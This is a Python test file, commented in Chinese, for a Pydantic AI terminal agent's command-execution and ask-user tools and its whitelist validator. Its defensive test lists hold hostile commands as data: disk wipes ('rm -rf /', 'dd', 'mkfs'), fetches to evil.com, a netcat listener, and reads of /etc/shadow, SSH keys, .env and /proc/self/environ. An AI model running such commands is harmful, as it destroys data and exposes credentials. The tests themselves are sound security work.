"""
B079: Pydantic AI Agent 核心实现测试。

测试覆盖：
1. Agent 创建和配置验证
2. execute_command 工具：合法命令执行、非法命令拒绝、超时处理、Agent 离线处理
3. ask_user 工具：推送问题、获取回复
4. Result 格式：AgentResult 转化为 CommandSequence
5. 白名单安全验证（复用 command_validator 的 27 个攻击向量）
6. 多轮对话（message_history）
"""
import asyncio
from dataclasses import dataclass
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from app.command_validator import validate_command
from app.ws_agent import ExecuteCommandResult


# ---------------------------------------------------------------------------
# 由于 app 包的 __init__.py 会触发完整的 FastAPI 初始化链，
# 我们需要在导入 terminal_agent 之前确保环境变量已设置（conftest.py 已处理）。
# ---------------------------------------------------------------------------
from app.terminal_agent import (
    AgentDeps,
    AgentResult,
    AgentRunOutcome,
    CommandSequenceStep,
    SYSTEM_PROMPT,
    _build_model,
    execute_command,
    ask_user,
    run_agent,
    terminal_agent,
)
from pydantic_ai import RunContext


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

def _make_execute_result(
    exit_code: int = 0,
    stdout: str = "",
    stderr: str = "",
    truncated: bool = False,
    timed_out: bool = False,
) -> ExecuteCommandResult:
    return ExecuteCommandResult(
        exit_code=exit_code,
        stdout=stdout,
        stderr=stderr,
        truncated=truncated,
        timed_out=timed_out,
    )


def _make_deps(
    execute_fn=None,
    ask_fn=None,
    session_id: str = "test-session",
    aliases: dict | None = None,
) -> AgentDeps:
    if execute_fn is None:
        execute_fn = AsyncMock(return_value=_make_execute_result(stdout="mock output"))
    if ask_fn is None:
        ask_fn = AsyncMock(return_value="user reply")
    return AgentDeps(
        session_id=session_id,
        execute_command_fn=execute_fn,
        ask_user_fn=ask_fn,
        project_aliases=aliases or {},
    )


def _make_run_context(deps: AgentDeps) -> RunContext[AgentDeps]:
    """创建一个最小化的 RunContext 用于直接测试 tool 函数。"""
    ctx = MagicMock(spec=RunContext)
    ctx.deps = deps
    return ctx


# ---------------------------------------------------------------------------
# Test: Agent 创建和配置验证
# ---------------------------------------------------------------------------

class TestAgentCreation:
    """测试 Agent 实例的配置是否正确。"""

    def test_agent_instance_exists(self):
        assert terminal_agent is not None

    def test_system_prompt_is_set(self):
        assert SYSTEM_PROMPT
        assert "决策优先级" in SYSTEM_PROMPT
        assert "自主探索" in SYSTEM_PROMPT
        assert "选项消歧" in SYSTEM_PROMPT

    def test_system_prompt_contains_security_constraints(self):
        """System prompt 应包含安全约束说明。"""
        assert "只读" in SYSTEM_PROMPT
        assert "不能执行写" in SYSTEM_PROMPT

    def test_build_model_returns_openai_model(self):
        model = _build_model()
        from pydantic_ai.models.openai import OpenAIModel
        assert isinstance(model, OpenAIModel)

    def test_agent_result_model(self):
        result = AgentResult(
            summary="test",
            steps=[CommandSequenceStep(id="step_1", label="cd", command="cd /home")],
        )
        assert result.summary == "test"
        assert len(result.steps) == 1
        assert result.provider == "agent"
        assert result.source == "recommended"
        assert result.need_confirm is True
        assert result.aliases == {}

    def test_command_sequence_step_model(self):
        step = CommandSequenceStep(id="s1", label="go", command="cd /project")
        assert step.id == "s1"
        assert step.command == "cd /project"

    def test_agent_deps_dataclass(self):
        deps = _make_deps()
        assert deps.session_id == "test-session"
        assert isinstance(deps.project_aliases, dict)

    def test_agent_deps_with_aliases(self):
        deps = _make_deps(aliases={"/home/user/project": "my-project"})
        assert deps.project_aliases["/home/user/project"] == "my-project"


# ---------------------------------------------------------------------------
# Test: execute_command 工具
# ---------------------------------------------------------------------------

class TestExecuteCommandTool:
    """测试 execute_command 工具的核心行为。"""

    @pytest.mark.asyncio
    async def test_valid_command_executes(self):
        """合法命令应成功执行并返回输出。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(
            stdout="file1.txt\nfile2.txt\n"
        ))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "ls -la /home")
        assert "file1.txt" in result
        execute_fn.assert_called_once_with("test-session", "ls -la /home", None)

    @pytest.mark.asyncio
    async def test_valid_command_with_cwd(self):
        """带 cwd 的命令应传递工作目录。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(stdout="ok"))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "ls", cwd="/tmp")
        execute_fn.assert_called_once_with("test-session", "ls", "/tmp")

    @pytest.mark.asyncio
    async def test_invalid_command_rejected(self):
        """非法命令应被白名单拦截，不调用执行函数。"""
        execute_fn = AsyncMock()
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "rm -rf /")
        assert "错误" in result
        assert "被拒绝" in result
        execute_fn.assert_not_called()

    @pytest.mark.asyncio
    async def test_shell_meta_rejected(self):
        """shell 元字符应被拦截。"""
        deps = _make_deps()
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "ls; rm -rf /")
        assert "错误" in result
        assert "元字符" in result

    @pytest.mark.asyncio
    async def test_sensitive_path_rejected(self):
        """敏感路径应被拦截。"""
        deps = _make_deps()
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "cat /etc/shadow")
        assert "错误" in result
        assert "敏感路径" in result

    @pytest.mark.asyncio
    async def test_command_substitution_rejected(self):
        """命令替换应被拦截。"""
        deps = _make_deps()
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "echo $(whoami)")
        assert "错误" in result

    @pytest.mark.asyncio
    async def test_stderr_included_in_output(self):
        """stderr 应包含在输出中。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(
            stdout="stdout text",
            stderr="some warning",
        ))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "ls")
        assert "stdout text" in result
        assert "[stderr] some warning" in result

    @pytest.mark.asyncio
    async def test_nonzero_exit_code_in_output(self):
        """非零退出码应体现在输出中。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(
            exit_code=1,
            stdout="error output",
        ))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "ls")
        assert "[exit_code=1]" in result

    @pytest.mark.asyncio
    async def test_timeout_handling(self):
        """超时应返回超时信息。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(
            timed_out=True,
            exit_code=-1,
        ))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "ls")
        assert "超时" in result

    @pytest.mark.asyncio
    async def test_no_output_returns_placeholder(self):
        """无输出应返回占位文本。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(
            stdout="",
            stderr="",
        ))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "ls")
        assert "(无输出)" in result

    @pytest.mark.asyncio
    async def test_execution_exception_returns_error(self):
        """执行异常应返回错误信息而非抛出。"""
        execute_fn = AsyncMock(side_effect=ConnectionError("device offline"))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "ls")
        assert "错误" in result
        assert "ConnectionError" in result
        assert "device offline" in result

    @pytest.mark.asyncio
    async def test_generic_exception_returns_error(self):
        """通用异常应返回错误信息。"""
        execute_fn = AsyncMock(side_effect=RuntimeError("unexpected"))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "ls")
        assert "错误" in result
        assert "RuntimeError" in result


# ---------------------------------------------------------------------------
# Test: ask_user 工具
# ---------------------------------------------------------------------------

class TestAskUserTool:
    """测试 ask_user 工具的核心行为。"""

    @pytest.mark.asyncio
    async def test_ask_user_returns_reply(self):
        """ask_user 应返回用户的回复。"""
        ask_fn = AsyncMock(return_value="I want project A")
        deps = _make_deps(ask_fn=ask_fn)
        ctx = _make_run_context(deps)

        result = await ask_user(ctx, "Which project?")
        assert result == "I want project A"
        ask_fn.assert_called_once_with("Which project?", [], False)

    @pytest.mark.asyncio
    async def test_ask_user_with_options(self):
        """ask_user 应传递选项。"""
        ask_fn = AsyncMock(return_value="project-a")
        deps = _make_deps(ask_fn=ask_fn)
        ctx = _make_run_context(deps)

        result = await ask_user(
            ctx,
            "Select a project:",
            options=["project-a", "project-b"],
        )
        assert result == "project-a"
        ask_fn.assert_called_once_with(
            "Select a project:",
            ["project-a", "project-b"],
            False,
        )

    @pytest.mark.asyncio
    async def test_ask_user_with_multi_select(self):
        """ask_user 应传递 multi_select 标志。"""
        ask_fn = AsyncMock(return_value="option1, option2")
        deps = _make_deps(ask_fn=ask_fn)
        ctx = _make_run_context(deps)

        result = await ask_user(
            ctx,
            "Select multiple:",
            options=["option1", "option2", "option3"],
            multi_select=True,
        )
        assert result == "option1, option2"
        ask_fn.assert_called_once_with(
            "Select multiple:",
            ["option1", "option2", "option3"],
            True,
        )

    @pytest.mark.asyncio
    async def test_ask_user_none_options_defaults_to_empty(self):
        """options 为 None 时应默认为空列表。"""
        ask_fn = AsyncMock(return_value="text reply")
        deps = _make_deps(ask_fn=ask_fn)
        ctx = _make_run_context(deps)

        result = await ask_user(ctx, "What?", options=None)
        assert result == "text reply"
        ask_fn.assert_called_once_with("What?", [], False)


# ---------------------------------------------------------------------------
# Test: AgentResult 格式与 CommandSequence 兼容性
# ---------------------------------------------------------------------------

class TestAgentResultFormat:
    """测试 AgentResult 格式与 runtime_api 的 AssistantCommandSequence 兼容。"""

    def test_minimal_result(self):
        result = AgentResult(
            summary="cd to project and start claude",
            steps=[
                CommandSequenceStep(id="step_1", label="进入项目目录", command="cd /home/user/project"),
                CommandSequenceStep(id="step_2", label="启动 Claude", command="claude"),
            ],
        )
        assert result.summary
        assert len(result.steps) == 2
        assert result.provider == "agent"
        assert result.source == "recommended"
        assert result.need_confirm is True

    def test_result_with_aliases(self):
        result = AgentResult(
            summary="open project",
            steps=[CommandSequenceStep(id="s1", label="go", command="cd /app")],
            aliases={"/app": "my-app", "/app/v2": "my-app-v2"},
        )
        assert len(result.aliases) == 2
        assert result.aliases["/app"] == "my-app"

    def test_step_fields_match_assistant_command_step(self):
        """CommandSequenceStep 字段应与 runtime_api.AssistantCommandStep 对齐。"""
        step = CommandSequenceStep(id="step_1", label="test", command="pwd")
        # AssistantCommandStep 的字段：id, label, command
        assert hasattr(step, 'id')
        assert hasattr(step, 'label')
        assert hasattr(step, 'command')

    def test_empty_steps_valid(self):
        """空 steps 列表应该是合法的（agent 无法确定时）。"""
        result = AgentResult(
            summary="无法确定项目位置",
            steps=[],
        )
        assert result.steps == []

    def test_result_serialization(self):
        """AgentResult 应可序列化为 dict/JSON。"""
        result = AgentResult(
            summary="test",
            steps=[CommandSequenceStep(id="s1", label="go", command="cd /tmp")],
            aliases={"/tmp": "temp"},
        )
        data = result.model_dump()
        assert isinstance(data, dict)
        assert data["summary"] == "test"
        assert data["steps"][0]["command"] == "cd /tmp"
        assert data["aliases"]["/tmp"] == "temp"

    def test_result_from_dict(self):
        """AgentResult 应可从 dict 反序列化。"""
        data = {
            "summary": "hello",
            "steps": [{"id": "s1", "label": "go", "command": "pwd"}],
            "provider": "agent",
            "source": "recommended",
            "need_confirm": True,
            "aliases": {},
        }
        result = AgentResult(**data)
        assert result.summary == "hello"
        assert len(result.steps) == 1


# ---------------------------------------------------------------------------
# Test: 白名单安全验证（27 个攻击向量）
# ---------------------------------------------------------------------------

class TestSecurityAttackVectors:
    """复用 command_validator 的三重防护，验证 Agent 工具层也能拦截。

    这些测试直接调用 validate_command 来确保白名单一致性。
    与 test_command_validator.py 互补，确认 terminal_agent 工具层
    对命令的验证与 command_validator 完全一致。
    """

    # --- 白名单外命令（不在白名单的命令）---

    @pytest.mark.parametrize("malicious_cmd", [
        "rm -rf /",
        "sudo ls",
        "bash -c 'echo hi'",
        "python3 -c 'import os'",
        "curl http://evil.com",
        "wget http://evil.com",
        "ssh attacker@host",
        "nc -l 8080",
        "chmod 777 /etc/passwd",
        "mkdir /tmp/evil",
        "cp /etc/passwd /tmp",
        "mv /etc/hosts /tmp",
        "dd if=/dev/zero of=/dev/sda",
        "shutdown -h now",
        "reboot",
        "mkfs.ext4 /dev/sda",
    ])
    @pytest.mark.asyncio
    async def test_non_whitelisted_commands_blocked(self, malicious_cmd):
        """白名单外命令通过 execute_command 工具应被拒绝。"""
        deps = _make_deps()
        ctx = _make_run_context(deps)
        result = await execute_command(ctx, malicious_cmd)
        assert "错误" in result, f"'{malicious_cmd}' 应被拦截"

    # --- Shell 元字符攻击 ---

    @pytest.mark.parametrize("meta_cmd", [
        "ls; rm -rf /",
        "ls | grep secret",
        "ls &",
        "echo $HOME",
        "echo `whoami`",
        "echo $(whoami)",
        "echo hi > /tmp/file",
        "echo hi >> /tmp/file",
    ])
    @pytest.mark.asyncio
    async def test_shell_meta_commands_blocked(self, meta_cmd):
        """shell 元字符命令通过 execute_command 工具应被拒绝。"""
        deps = _make_deps()
        ctx = _make_run_context(deps)
        result = await execute_command(ctx, meta_cmd)
        assert "错误" in result, f"'{meta_cmd}' 应被拦截"

    # --- 敏感路径攻击 ---

    @pytest.mark.parametrize("sensitive_cmd", [
        "cat /etc/shadow",
        "ls /etc/ssh",
        "cat .ssh/id_rsa",
        "cat ~/.ssh/id_ed25519",
        "cat .ssh/known_hosts",
        "cat .ssh/authorized_keys",
        "cat .env",
        "cat server.key",
        "cat /proc/self/environ",
    ])
    @pytest.mark.asyncio
    async def test_sensitive_path_commands_blocked(self, sensitive_cmd):
        """敏感路径命令通过 execute_command 工具应被拒绝。"""
        deps = _make_deps()
        ctx = _make_run_context(deps)
        result = await execute_command(ctx, sensitive_cmd)
        assert "错误" in result, f"'{sensitive_cmd}' 应被拦截"

    # --- Git 危险子命令 ---

    @pytest.mark.parametrize("git_cmd", [
        "git push",
        "git pull",
        "git checkout main",
        "git reset --hard",
        "git clean -fd",
        "git commit -m 'hack'",
    ])
    @pytest.mark.asyncio
    async def test_dangerous_git_commands_blocked(self, git_cmd):
        """git 危险子命令通过 execute_command 工具应被拒绝。"""
        deps = _make_deps()
        ctx = _make_run_context(deps)
        result = await execute_command(ctx, git_cmd)
        assert "错误" in result, f"'{git_cmd}' 应被拦截"


# ---------------------------------------------------------------------------
# Test: run_agent 集成（mock 模型层）
# ---------------------------------------------------------------------------

class TestRunAgent:
    """测试 run_agent 公开接口（mock Agent.run）。"""

    @pytest.mark.asyncio
    async def test_run_agent_returns_agent_run_outcome(self):
        """run_agent 应返回 AgentRunOutcome 实例。"""
        mock_result = MagicMock()
        mock_result.output = AgentResult(
            summary="entered project",
            steps=[CommandSequenceStep(id="s1", label="go", command="cd /project")],
        )
        mock_usage = MagicMock()
        mock_usage.input_tokens = 100
        mock_usage.output_tokens = 50
        mock_usage.total_tokens = 150
        mock_usage.requests = 2
        mock_result.usage = MagicMock(return_value=mock_usage)

        with patch.object(terminal_agent, 'run', new_callable=AsyncMock, return_value=mock_result):
            outcome = await run_agent(
                intent="进入 my-project",
                session_id="session-1",
                execute_command_fn=AsyncMock(),
                ask_user_fn=AsyncMock(),
            )

        assert isinstance(outcome, AgentRunOutcome)
        assert isinstance(outcome.result, AgentResult)
        assert outcome.result.summary == "entered project"
        assert len(outcome.result.steps) == 1
        assert outcome.input_tokens == 100
        assert outcome.output_tokens == 50
        assert outcome.total_tokens == 150
        assert outcome.requests == 2
        assert outcome.model_name != ""  # planner_model() 应返回非空字符串

    @pytest.mark.asyncio
    async def test_run_agent_passes_deps_correctly(self):
        """run_agent 应正确构建并传递 AgentDeps。"""
        mock_result = MagicMock()
        mock_result.output = AgentResult(
            summary="ok",
            steps=[CommandSequenceStep(id="s1", label="go", command="pwd")],
        )
        mock_result.usage = MagicMock(return_value=MagicMock(
            input_tokens=0, output_tokens=0, total_tokens=0, requests=0,
        ))

        execute_fn = AsyncMock()
        ask_fn = AsyncMock()
        aliases = {"/app": "my-app"}

        with patch.object(terminal_agent, 'run', new_callable=AsyncMock, return_value=mock_result) as mock_run:
            await run_agent(
                intent="打开项目",
                session_id="sess-1",
                execute_command_fn=execute_fn,
                ask_user_fn=ask_fn,
                project_aliases=aliases,
            )

            call_kwargs = mock_run.call_args
            deps = call_kwargs.kwargs.get('deps') or call_kwargs[1].get('deps')
            assert deps.session_id == "sess-1"
            assert deps.project_aliases == aliases

    @pytest.mark.asyncio
    async def test_run_agent_with_message_history(self):
        """run_agent 应传递 message_history。"""
        mock_result = MagicMock()
        mock_result.output = AgentResult(
            summary="ok",
            steps=[],
        )
        mock_result.usage = MagicMock(return_value=MagicMock(
            input_tokens=0, output_tokens=0, total_tokens=0, requests=0,
        ))

        history = [{"role": "user", "content": "之前说打开 project-a"}]

        with patch.object(terminal_agent, 'run', new_callable=AsyncMock, return_value=mock_result) as mock_run:
            await run_agent(
                intent="现在打开 project-b",
                session_id="sess-1",
                execute_command_fn=AsyncMock(),
                ask_user_fn=AsyncMock(),
                message_history=history,
            )

            call_kwargs = mock_run.call_args
            assert call_kwargs.kwargs.get('message_history') == history or \
                   call_kwargs[1].get('message_history') == history

    @pytest.mark.asyncio
    async def test_run_agent_defaults_aliases_to_empty(self):
        """project_aliases 默认应为空 dict。"""
        mock_result = MagicMock()
        mock_result.output = AgentResult(summary="ok", steps=[])
        mock_result.usage = MagicMock(return_value=MagicMock(
            input_tokens=0, output_tokens=0, total_tokens=0, requests=0,
        ))

        with patch.object(terminal_agent, 'run', new_callable=AsyncMock, return_value=mock_result) as mock_run:
            await run_agent(
                intent="test",
                session_id="s1",
                execute_command_fn=AsyncMock(),
                ask_user_fn=AsyncMock(),
            )

            deps = mock_run.call_args.kwargs.get('deps')
            assert deps.project_aliases == {}

    @pytest.mark.asyncio
    async def test_run_agent_defaults_history_to_none(self):
        """message_history 默认应为 None。"""
        mock_result = MagicMock()
        mock_result.output = AgentResult(summary="ok", steps=[])
        mock_result.usage = MagicMock(return_value=MagicMock(
            input_tokens=0, output_tokens=0, total_tokens=0, requests=0,
        ))

        with patch.object(terminal_agent, 'run', new_callable=AsyncMock, return_value=mock_result) as mock_run:
            await run_agent(
                intent="test",
                session_id="s1",
                execute_command_fn=AsyncMock(),
                ask_user_fn=AsyncMock(),
            )

            msg_history = mock_run.call_args.kwargs.get('message_history')
            assert msg_history is None


# ---------------------------------------------------------------------------
# Test: execute_command 在 agent 上下文中的综合行为
# ---------------------------------------------------------------------------

class TestExecuteCommandComprehensive:
    """测试 execute_command 在各种执行结果下的行为。"""

    @pytest.mark.asyncio
    async def test_combined_stdout_stderr_exitcode(self):
        """stdout + stderr + 非零 exit_code 的组合输出。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(
            exit_code=2,
            stdout="some output",
            stderr="error message",
        ))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "grep pattern missing-file")
        assert "some output" in result
        assert "[stderr] error message" in result
        assert "[exit_code=2]" in result

    @pytest.mark.asyncio
    async def test_only_stderr_no_stdout(self):
        """只有 stderr 没有 stdout。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(
            exit_code=1,
            stdout="",
            stderr="No such file",
        ))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "ls /nonexistent")
        assert "[stderr] No such file" in result
        assert "[exit_code=1]" in result

    @pytest.mark.asyncio
    async def test_timeout_with_partial_stdout(self):
        """超时但有部分 stdout。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(
            exit_code=-1,
            stdout="partial output...",
            stderr="",
            timed_out=True,
        ))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "find / -name '*.log'")
        assert "超时" in result

    @pytest.mark.asyncio
    async def test_git_status_passes(self):
        """git status 应该通过并返回结果。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(
            stdout="On branch main\nnothing to commit\n"
        ))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "git status")
        assert "On branch main" in result
        execute_fn.assert_called_once()

    @pytest.mark.asyncio
    async def test_find_with_name_passes(self):
        """find -name 应该通过。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(
            stdout="./project-a\n./project-b\n"
        ))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "find . -name 'package.json' -maxdepth 3")
        assert "project-a" in result

    @pytest.mark.asyncio
    async def test_find_exec_blocked(self):
        """find -exec 应被拦截。"""
        deps = _make_deps()
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "find . -name '*.tmp' -exec rm {} +")
        assert "错误" in result
